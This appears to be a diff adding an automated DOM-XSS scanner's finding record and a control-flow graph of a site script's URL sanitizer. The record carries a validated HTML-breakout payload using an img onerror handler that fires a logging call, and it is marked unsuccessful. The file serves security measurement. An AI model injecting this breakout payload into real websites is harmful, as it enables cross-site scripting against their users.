@@ -1,0 +1,115 @@
+// Finding: 9d90e433-af6c-4f88-a3f5-c27606cf710c
+// Finding.url: https://www.example6.com/atlantic-immigration-pilot-program.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('53aa189bebc848d09b50f3c00ea56933')><!--/*
+// Finding.parentloc: https://www.example6.com/atlantic-immigration-pilot-program.html##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('53aa189bebc848d09b50f3c00ea56933')><!--/*
+// Finding.domain: www.example6.com
+// Finding.base_domain: example6.com
+// Finding.source: location.href
+// Finding.sink: insertAdjacentHTML
+// Sanitizer.score: 1
+// Sanitizer.name: et
+// Sanitizer.location: https://fast.example7.com/client/2105/13141925/min/v1_gs_lib.js - et:1:31519
+// Finding.begin: 7667
+// Finding.end: 7693
+// Finding.original_uuid: 10ae07cc-d53c-4769-8821-7bac5af15f61
+// Finding.TwentyFiveMillionFlowsId: -1553099252
+// Finding.script: https://fast.example7.com/client/2105/13141925/min/v1_gs_lib.js
+// Finding.line: 3
+// Exploit.uuid: 53aa189b-ebc8-48d0-9b50-f3c00ea56933
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 26
+// Exploit.replace_begin_url: 66
+// Exploit.replace_end_url: 66
+// Exploit.replace_begin_param: 2182
+// Exploit.replace_end_param: 2182
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: true
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1878459710
+// DepGraph.sanitizer_hash: -1215258200
+// Part of the URL ('##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('53aa189bebc848d09b50f3c00ea56933')><!--/*') found in left hand side of replace 
+// Part of the URL ('/atlantic-immigration-pilot-program.html##') found in left hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="Lit: ##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('53aa189bebc848d09b50f3c00ea56933')><!--/*"];
+n3 [shape=box, label="Lit: ##"];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="str_replace_once"];
+n6 [shape=box, label="Lit: /atlantic-immigration-pilot-program.html##"];
+n7 [shape=box, label="Lit: "];
+n8 [shape=box, label="Var: x"];
+n9 [shape=ellipse, label="str_replace_once"];
+n10 [shape=box, label="Lit: ##"];
+n11 [shape=box, label="Lit: "];
+n12 [shape=box, label="Var: x"];
+n13 [shape=ellipse, label="decodeURIComponent"];
+n14 [shape=box, label="Var: x"];
+n15 [shape=ellipse, label="preg_replace"];
+n16 [shape=box, label="RegExp: /\u00AD/"];
+n17 [shape=box, label="Lit: %C2%AD"];
+n18 [shape=box, label="Var: x"];
+n19 [shape=ellipse, label="str_replace_once"];
+n20 [shape=box, label="RegExp: /#gs\.(.)*/"];
+n21 [shape=box, label="Lit: "];
+n22 [shape=box, label="Var: x"];
+n23 [shape=ellipse, label="str_replace_once"];
+n24 [shape=box, label="Lit: &"];
+n25 [shape=box, label="Lit: ?"];
+n26 [shape=box, label="Var: x"];
+n27 [shape=box, label="Var: x"];
+n28 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n8 -> n1;
+n5 -> n6;
+n5 -> n7;
+n5 -> n8;
+n12 -> n5;
+n9 -> n10;
+n9 -> n11;
+n9 -> n12;
+n14 -> n9;
+n13 -> n14;
+n18 -> n13;
+n15 -> n16;
+n15 -> n17;
+n15 -> n18;
+n22 -> n15;
+n19 -> n20;
+n19 -> n21;
+n19 -> n22;
+n26 -> n19;
+n23 -> n24;
+n23 -> n25;
+n23 -> n26;
+n27 -> n23;
+n28 -> n27;
+}
